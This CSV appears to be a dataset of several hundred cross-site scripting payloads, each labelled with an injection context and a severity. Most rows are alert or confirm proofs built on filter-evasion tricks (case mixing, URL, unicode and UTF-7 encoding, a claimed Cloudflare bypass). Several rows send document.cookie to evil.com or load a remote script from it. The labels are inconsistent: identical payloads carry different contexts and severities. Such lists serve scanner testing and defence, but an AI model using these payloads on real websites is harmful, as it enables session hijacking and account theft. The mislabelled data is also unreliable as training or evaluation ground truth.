payload,context,severity
""" onload=alert(1) x=""",attribute_escape,low
"<iframe src=""javascript:alert(1)"">",tag_injection,low
javascript:confirm(1),js_uri,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
\' onerror=alert(1)//,template_injection,medium
"\""><img src=x onload=alert(1)>",attribute_escape,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
;alert(1);,tag_injection,medium
"//"";alert(String.fromCharCode(88,83,83))",attribute_escape,high
%3Cimg/src=%3Dx+onload=alert(2)%3D,tag_injection,medium
&lt;body onload=alert(1)&gt;,template_injection,high
<image src/onerror=alert(1)>,tag_injection,medium
"""><img src=x onerror=alert(1)>",attribute_escape,medium
"\"" onerror=alert(1)//",attribute_escape,medium
"eval(""alert(1)"")",dom_sink,high
<script src=//evil.com/xss.js></script>,script_injection,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
\x3cscript\x3econfirm(1)\x3c/script\x3e,script_injection,medium
javascript:alert(1),js_uri,low
&quot; onerror=alert(1) x=&quot;,template_injection,low
"document.write(""<svg src=x onerror=alert(1)>"")",dom_sink,medium
onload='alert(1)',tag_injection,medium
"<iframe src=""javascript:alert(1)"">",tag_injection,high
onclick=”alert(‘AnonKryptiQuz’),tag_injection,medium
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
javascript:confirm(1),dom_sink,low
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<iframe/onload=alert(0);>,tag_injection,medium
\' onerror=alert(1)//,template_injection,medium
""" onload=confirm(1) x=""",attribute_escape,high
<svgonload=alert(1)>,tag_injection,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
&lt;script&gt;confirm(1)&lt;/script&gt;,script_injection,high
<img/src=x onerror=confirm(1)//>,script_injection,low
' oNmOuSeOvEr=aLeRt(1) ',attribute_escape,high
<svg/onload=alert(1)>,tag_injection,high
"<object data=""javascript:alert(1)"">",tag_injection,low
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,tag_injection,medium
onload='alert(1)',tag_injection,medium
"<object data=""javascript:alert(1)"">",tag_injection,low
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
onerror=prompt`1`;>,tag_injection,medium
"\"" onerror=alert(1)//",dom_sink,high
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
"<iframe src=""javascript:confirm(1)"">",tag_injection,high
${alert(1)},template_injection,medium
jAvAsCrIpT:AlErT(1),js_uri,low
javascript:alert(document.domain),js_uri,low
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",tag_injection,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
<svg////////onload=alert(1)>,tag_injection,medium
""" onload=alert(1) x=""",attribute_escape,medium
javascript:confirm(1),js_uri,high
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,high
</tag><svg onload=alert(1)>,tag_injection,medium
"document.body.innerHTML=""%3Cimg src=x onerror=alert(1)%3E""",dom_sink,low
"""><script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
javascript:alert(document.domain),event_handler,medium
' onerror=alert(1) x=',attribute_escape,medium
\x3cbody onload=alert(1)\x3e,tag_injection,high
\' onerror=alert(1)//,attribute_escape,high
<svg/onload=alert(1)>,dom_sink,medium
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
"""><svg onload=alert()>",tag_injection,medium
"OnloAd=""AlErT(1)""",tag_injection,medium
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
"<svg/onload=alert(String.fromCharCode(88,83,83))>",tag_injection,high
<svg/onload=alert(1)>,tag_injection,medium
<svg onload=alert(1)>,tag_injection,medium
"location=""javascript:confirm(1)""",event_handler,high
<ScRiPt>cOnFiRm(1)</sCrIpT>,script_injection,medium
"<table>alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
"?alert(1)"",",tag_injection,medium
<%= alert(1) %>,template_injection,low
<video src=x onerror=alert(1)>,event_handler,medium
"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,low
"<svG/x="">""/oNloaD=alert`1`//",attribute_escape,medium
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,tag_injection,medium
"document.body.innerHTML=""<img src=x onload=alert(1)>""",dom_sink,high
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
{{7*7}},template_injection,low
{{7*7}},template_injection,medium
${alert(1)},event_handler,medium
"\"" onload=alert(1)//",attribute_escape,high
OnLOAD='ALeRT(1)',tag_injection,medium
<svg id=1 onload=confirm(1)>,tag_injection,medium
"sEtTiMeOuT(""aLeRt(1)"",0)",dom_sink,low
<img src/onerror=prompt(8)>,tag_injection,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
""" onload=alert(1) x=""",attribute_escape,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
<Svg Onload=ALERT()>,tag_injection,medium
<input ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
"<marquee onstart
=alert(	1)>",event_handler,medium
alert(1);,tag_injection,medium
{{7*7}},script_injection,high
"location=""javascript:alert(1)""",dom_sink,low
<BODY ONLOAD=alert(’XSS’)>,attribute_escape,medium
javascript:alert(1),js_uri,high
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,low
"""><script
>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,tag_injection,medium
<input onfocus=alert(1) autofocus>,attribute_escape,low
<details open ontoggle=alert(1)>,event_handler,medium
%3Cimg src=x onerror=alert(1)%3E,event_handler,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
""" onfocus=alert(1) autofocus=""",attribute_escape,medium
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",tag_injection,high
'onload=print()><svg/1=',attribute_escape,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
"javascript:void(document.location=""http://evil.com"")",tag_injection,low
<ScRiPt>pRoMpT(1)</ScRiPt>,script_injection,low
<SCRIPT>alert(document.domain)</SCRIPT>,script_injection,low
\x3cscript\x3eprompt(1)\x3c/script\x3e,attribute_escape,medium
innerHTML=location.hash>#<textarea>alert(1)</script>,attribute_escape,high
<script>alert(document.domain)</script>,script_injection,low
javascript:alert(1),js_uri,low
"?alert(1)"",",tag_injection,medium
setInterval('ale'+'rt(10)');,tag_injection,high
onerror='alert(1)',tag_injection,medium
< script>d.innerHTML+='';</script>,tag_injection,high
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
""" onload=alert(1) x=""",tag_injection,high
<body onload=alert(1)>,template_injection,medium
<SCRIPT>alert(1)</SCRIPT>,event_handler,low
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
"setTimeout(""\u0061\u006cert(1)"",0)",attribute_escape,medium
<img src/onerror=alert(1)>,tag_injection,medium
"%20""><svg onload=alert(1)>",tag_injection,medium
<video src=x onerror=alert(1)>,event_handler,low
"document.write(""<img src=x onerror=confirm(1)>"")",tag_injection,high
alert(1),tag_injection,medium
"onload&#61;""alert(1)""",tag_injection,medium
<svg onload=eval(document.cookie)>,script_injection,high
"setTimeout(""alert(1)"",0)",event_handler,high
"<scr/**/ipt>document.location=""http://evil.com/?c=""+document.cookie</scr/**/ipt>",script_injection,low
"//"";alert(document.domain))",tag_injection,high
"{{constructor.constructor(""\u0061\u006cert(1)"")()}}",tag_injection,low
<body onload=alert(1)>,tag_injection,medium
"""></tag><svg onload=alert(1)>",tag_injection,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
"""><img src=x onerror=alert(1)>",attribute_escape,medium
javascript:confirm(1),js_uri,low
%3Cimg/src=%3Dx+onload=alert(2)%3D,tag_injection,medium
onerror=alert;throw 23;,tag_injection,low
"onerror=""alert(1)""",tag_injection,medium
"""\x3e\x3cimg src=x onerror=alert(1)\x3e",attribute_escape,low
&lt;%= alert(1) %&gt;,template_injection,high
<svg onload=alert(1)>,attribute_escape,high
"location=""javascript:alert(1)""",script_injection,high
<img src/onerror=alert(1)>,tag_injection,medium
"' onmouseover
=alert(	1) '",attribute_escape,low
"{{constructor.constructor(valueOf.name.constructor.fromCharCode(97,108,101,114,116,40,49,41,10))()}}",js_uri,high
innerHTML=location.hash>#<button>alert(1)</script>,tag_injection,high
"""><%00script>alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
\' onerror=alert(1)//,attribute_escape,low
<svg/onload=alert(1)>,script_injection,high
"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
<svgonload=alert(1)>,tag_injection,medium
alert(2),tag_injection,medium
<image src/onerror=alert(1)>,tag_injection,medium
javascript:confirm(1),script_injection,medium
&lt;marquee onstart=alert(1)&gt;,script_injection,high
< script>d.innerHTML+='';</script>,tag_injection,high
' ><img src=x onerror=alert(1)>,tag_injection,high
<img src/onerror=alert(1)>,tag_injection,medium
"location=""javaSCRIPT:alert(1)""",dom_sink,medium
\' onerror=alert(1)//,template_injection,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",attribute_escape,high
<input onfocus=alert(1) autofocus>,event_handler,low
""">< script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
"""><img src=x onerror=alert(1)>",attribute_escape,high
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
onload='alert(1)',tag_injection,medium
"dOcUmEnT.WrItE(""<ImG SrC=X OnErRoR=AlErT(1)>"")",dom_sink,medium
"\""><img src=x onerror=alert(1)>",attribute_escape,low
"<IfRaMe sRc=""JaVaScRiPt:aLeRt(1)"">",tag_injection,high
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",tag_injection,high
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
' onload=alert(1) x=',attribute_escape,medium
javaSCRIPT:confirm(1),js_uri,medium
<svg/onload=alert(1)>,tag_injection,medium
"<object data=""javascript:confirm(1)"">",tag_injection,low
<img src=x onerror=alert(1)>,tag_injection,high
javascript:alert(document.domain),js_uri,medium
<iframe/onload=alert(0);>,attribute_escape,medium
"""><img src=x onerror=alert(1)>",attribute_escape,high
<details open ontoggle=alert(1)>,event_handler,high
<img src/onerror=prompt(8)>,tag_injection,medium
' onerror=alert(1) x=',template_injection,low
+alert(1)+,tag_injection,medium
"//"";alert(String.fromCharCode(88,83,83))",attribute_escape,high
<svg onload=print()>,attribute_escape,medium
"\""><img src=x onerror=confirm(1)>",attribute_escape,medium
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
alert(1),tag_injection,medium
"\""><img src=x onerror=confirm(1)>",attribute_escape,low
${alert(	1)},template_injection,high
"#""><svg onload=alert(1)>",attribute_escape,medium
"""><svg onload=alert(1)>",attribute_escape,medium
<BODY ONLOAD=alert(8839)>,tag_injection,medium
javascript:alert(1),js_uri,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
<img src=x onerror=alert(1)>,tag_injection,high
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,script_injection,medium
<img src=x onerror=confirm(1)>,tag_injection,low
javascript:alert(document.domain),attribute_escape,high
"javaSCRIPT:void(document.location=""http://evil.com"")",js_uri,low
<img src/onerror=prompt(8)>,tag_injection,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
alert(1);,tag_injection,medium
' onmouseover=alert(1) ',script_injection,medium
"%20""><svg onload=alert(1)>",tag_injection,medium
%3Cimg/src=x onerror=alert(1)//%3E,event_handler,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
"ONERRor=""AlerT(1)""",tag_injection,medium
\x3cscript src=//evil.com/xss.js\x3e\x3c/script\x3e,script_injection,medium
"<embed src
=""javascript:alert(	1)"">",attribute_escape,medium
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
"location=""javascript:alert(1)""",tag_injection,medium
ONLoad='alErt(1)',tag_injection,medium
<svg onload=alert(1)>,event_handler,high
"\""><img src=x onerror=alert(1)>",attribute_escape,low
<img/src/onerror=alert(1),attribute_escape,medium
<svgonload=alert(1)>,tag_injection,medium
< script>d.innerHTML+='';</script>,tag_injection,high
{{7*7}},template_injection,low
"<embed src=""javascript:confirm(1)"">",tag_injection,high
' onerror=alert(1) x=',attribute_escape,low
<scr/**/ipt>prompt(1)</scr/**/ipt>,script_injection,high
<svg onload=alert(1)>,event_handler,medium
alert(1);,tag_injection,medium
<svg onload=alert(1)>,event_handler,low
"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;",script_injection,medium
<SvG OnLoAd=aLeRt(1)>,event_handler,high
"top.alert(1))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
<script>alert(document.domain)</script>,script_injection,high
<svgonload=alert(1)>,tag_injection,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
{{7*7}},script_injection,medium
prompt(9),tag_injection,medium
"location=""javascript:alert(1)""",dom_sink,high
onerror=alert;throw 23;,tag_injection,low
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
#{alert(1)},template_injection,low
"<script
>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute_escape,high
""" onfocus=alert(1) autofocus=""",attribute_escape,medium
"<embed src
=""javascript:alert(	1)"">",tag_injection,medium
"<%00script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",tag_injection,high
onerror='alert(1)',tag_injection,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",tag_injection,high
""" onfocus=\u0061\u006cert(1) \u0061utofocus=""",attribute_escape,medium
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
<BODY ONLOAD=alert(8839)>,tag_injection,medium
javascript:alert(1),js_uri,low
alert(document.domain),attribute_escape,medium
<img/src=x onload=alert(1)//>,template_injection,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",tag_injection,high
"data:text/html,<script>alert(1)</script>",js_uri,low
\x3cscript src=//evil.com/xss.js\x3e\x3c/script\x3e,event_handler,high
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
"{{constructor.constructor(""al'+'ert(1)"")()}}",js_uri,low
<img/src=x onerror=alert(1)//>,js_uri,medium
"""><script
>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",tag_injection,high
"""><script/ alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
"<svg onload=""confirm(7)"">",tag_injection,medium
"<details open ontoggle
=alert(	1)>",event_handler,medium
{{7*7}},template_injection,medium
#{alert(1)},template_injection,high
"#""><svg onload=alert(1)>",tag_injection,medium
<ImG/SrC=X OnErRoR=AlErT(1)//>,event_handler,high
"\""><img src=x onerror=alert(1)>",attribute_escape,low
"""><script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
${alert(1)},template_injection,low
<img src/onerror=alert(1)>,tag_injection,medium
<svgonload=alert(1)>,tag_injection,medium
"setTimeout(""alert(1)"",0)",dom_sink,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
;alert(123);,tag_injection,medium
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",script_injection,low
onerror='alert(1)',tag_injection,medium
alert(document.cookie),tag_injection,medium
ONLoAD='aLERT(1)',attribute_escape,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"{{constructor.constructor(""alert(1)"")()}}",event_handler,low
javaSCRIPT:confirm(1),js_uri,low
"""><img src=x onerror=al'+'ert(1)>",attribute_escape,medium
${alert(1)},event_handler,medium
